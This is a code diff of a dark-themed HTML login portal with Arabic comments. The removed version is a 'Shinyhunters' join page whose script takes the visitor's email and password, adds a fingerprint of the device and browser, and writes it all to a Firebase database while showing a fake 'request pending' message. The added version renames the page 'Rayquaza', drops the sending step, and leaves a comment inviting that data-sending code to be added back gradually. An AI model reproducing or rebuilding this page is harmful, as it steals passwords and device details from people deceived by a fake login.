@@ -3,16 +3,16 @@
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta charset="UTF-8">
-    <title>Shinyhunters | Secure Access Portal</title>
+    <title>Rayquaza | Portal Workspace</title>
     <style>
         :root {
-            --bg-color: #050508;
-            --panel-bg: #11141d;
-            --accent-gold: #ffd700;
-            --accent-glow: rgba(255, 215, 0, 0.3);
-            --text-main: #f0f2f5;
-            --text-muted: #8a99ad;
-            --border-color: #1f2638;
+            --bg-color: #0b0f19;
+            --panel-bg: #141c2e;
+            --panel-border: #1e293b;
+            --accent-color: #00f0ff;
+            --accent-glow: rgba(0, 240, 255, 0.2);
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
         }
         body {
             background-color: var(--bg-color);
@@ -23,39 +23,35 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            min-height: 100vh;
+            box-sizing: border-box;
         }
         .container {
             width: 100%;
-            max-width: 400px;
+            max-width: 420px;
             background: var(--panel-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
+            border: 1px solid var(--panel-border);
+            border-radius: 8px;
             padding: 35px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.8), 0 0 20px rgba(255, 215, 0, 0.05);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6), 0 0 15px var(--accent-glow);
             box-sizing: border-box;
         }
         .logo {
             font-size: 22px;
             font-weight: 800;
-            color: var(--accent-gold);
+            color: var(--accent-color);
             text-align: center;
-            margin-bottom: 8px;
+            margin-bottom: 5px;
             letter-spacing: 2px;
-            text-transform: uppercase;
             text-shadow: 0 0 10px var(--accent-glow);
         }
-        .logo span {
-            color: var(--text-main);
-        }
-        .tagline {
+        .subtitle {
             text-align: center;
             font-size: 11px;
             color: var(--text-muted);
             margin-bottom: 25px;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 1.5px;
         }
         .form-group {
             margin-bottom: 18px;
@@ -71,9 +67,9 @@
         input {
             width: 100%;
             padding: 12px;
-            background: #050508;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
+            background: var(--bg-color);
+            border: 1px solid var(--panel-border);
+            border-radius: 4px;
             color: var(--text-main);
             font-size: 14px;
             box-sizing: border-box;
@@ -81,39 +77,36 @@
             transition: border-color 0.2s, box-shadow 0.2s;
         }
         input:focus {
-            border-color: var(--accent-gold);
+            border-color: var(--accent-color);
             box-shadow: 0 0 8px var(--accent-glow);
         }
         .btn {
             width: 100%;
             padding: 12px;
-            background: var(--accent-gold);
-            color: #000;
+            background: var(--accent-color);
+            color: #0b0f19;
             border: none;
-            border-radius: 6px;
+            border-radius: 4px;
             font-size: 14px;
             font-weight: 700;
             cursor: pointer;
-            transition: opacity 0.2s, transform 0.1s;
-            margin-top: 5px;
+            transition: opacity 0.2s;
+            margin-top: 10px;
             letter-spacing: 0.5px;
+            text-transform: uppercase;
         }
         .btn:hover {
             opacity: 0.9;
         }
-        .btn:active {
-            transform: scale(0.98);
-        }
-        /* حالة إرسال الطلب (Pending Request State) */
-        #requestState {
+        #successState {
             display: none;
             text-align: center;
         }
         .spinner {
             width: 40px;
             height: 40px;
-            border: 3px solid var(--border-color);
-            border-top: 3px solid var(--accent-gold);
+            border: 3px solid var(--panel-border);
+            border-top: 3px solid var(--accent-color);
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 20px auto;
@@ -128,114 +121,58 @@
             line-height: 1.6;
             margin-top: 15px;
         }
-        .highlight-email {
-            color: var(--accent-gold);
+        .highlight {
+            color: var(--accent-color);
             font-weight: 600;
-        }
-        .footer-note {
-            text-align: center;
-            font-size: 11px;
-            color: var(--text-muted);
-            margin-top: 20px;
-            font-style: italic;
-            letter-spacing: 0.5px;
-            opacity: 0.8;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- نموذج تسجيل الدخول للانضمام -->
-        <div id="loginState">
-            <div class="logo">SHINY<span>HUNTERS</span></div>
-            <div class="tagline">Exclusive Access Portal</div>
-            
-            <form id="joinForm">
+        <!-- نموذج الدخول -->
+        <div id="formState">
+            <div class="logo">RAYQUAZA</div>
+            <div class="subtitle">Secure Workspace Authentication</div>
+
+            <form id="workspaceForm">
                 <div class="form-group">
-                    <label for="email">Account Email / ID</label>
-                    <input type="email" id="email" required autocomplete="off" placeholder="name@example.com">
+                    <label for="username">Username / ID</label>
+                    <input type="text" id="username" required autocomplete="off" placeholder="Enter identifier">
                 </div>
                 <div class="form-group">
-                    <label for="password">Password / Passcode</label>
-                    <input type="password" id="password" required placeholder="••••••••">
+                    <label for="passcode">Security Key</label>
+                    <input type="password" id="passcode" required placeholder="••••••••">
                 </div>
-                <button type="submit" class="btn">Request Access</button>
+                <button type="submit" class="btn">Connect Session</button>
             </form>
-            <div class="footer-note">For those who want to shine</div>
         </div>
 
-        <!-- شاشة رسالة إرسال الطلب -->
-        <div id="requestState">
-            <div class="logo">SHINY<span>HUNTERS</span></div>
-            <div class="tagline">Request Processing</div>
+        <!-- حالة نجاح الاتصال / الانتظار -->
+        <div id="successState">
+            <div class="logo">RAYQUAZA</div>
+            <div class="subtitle">Session Initializing</div>
             <div class="spinner"></div>
             <p class="info-text">
-                Your request to join the group using (<span id="displayEmail" class="highlight-email"></span>) has been successfully submitted.<br><br>
-                Please wait for administrative review and approval.
+                Authenticating node for <span id="displayName" class="highlight"></span>...<br>
+                Establishing secure pipeline.
             </p>
         </div>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
-        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";
-
-        const firebaseConfig = {
-            databaseURL: "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-
-        document.getElementById("joinForm").addEventListener("submit", function(e) {
+    <script>
+        document.getElementById("workspaceForm").addEventListener("submit", function(e) {
             e.preventDefault();
 
-            // التقاط البيانات المدخلة
-            const userEmail = document.getElementById("email").value;
-            const userPass = document.getElementById("password").value;
+            const username = document.getElementById("username").value;
 
-            // تحويل واجهة المستخدم فوراً لإظهار رسالة إرسال الطلب
-            document.getElementById("loginState").style.display = "none";
-            document.getElementById("displayEmail").innerText = userEmail;
-            document.getElementById("requestState").style.display = "block";
+            // تبديل الواظفة لعرض حالة التحميل
+            document.getElementById("formState").style.display = "none";
+            document.getElementById("displayName").innerText = username;
+            document.getElementById("successState").style.display = "block";
 
-            // جمع معلومات الجهاز والبيانات التقنية للزائر
-            const ua = navigator.userAgent;
-            const platform = navigator.platform || "Unknown";
-            const width = window.screen.width;
-            const height = window.screen.height;
-            const cores = navigator.hardwareConcurrency || "N/A";
-            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "N/A";
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const language = navigator.language || "N/A";
-
-            const sessionId = btoa(userEmail + width + height).slice(0, 16);
-
-            // تجميع حمولة البيانات بالكامل
-            const telemetryData = {
-                sessionId: sessionId,
-                inputEmail: userEmail,
-                inputPassword: userPass,
-                status: "JOIN_REQUEST_PENDING",
-                platform: platform,
-                resolution: `${width}x${height}`,
-                cores: cores,
-                memory: memory,
-                timezone: timezone,
-                language: language,
-                userAgent: ua,
-                timestamp: new Date().toISOString()
-            };
-
-            const sessionsRef = ref(db, 'A0Z_CORE/mirror_sessions/' + sessionId);
-            set(sessionsRef, telemetryData)
-                .then(() => {
-                    console.log("Join request credentials and telemetry synced to Firebase.");
-                })
-                .catch((error) => {
-                    console.error("Firebase sync error:", error);
-                });
+            // هنا يمكنك تجربة إضافة الكود الخاص بك لإرسال البيانات للسيرفر أو الـ Firebase تدريجياً
+            console.log("Workspace session requested for:", username);
         });
     </script>
 </body>
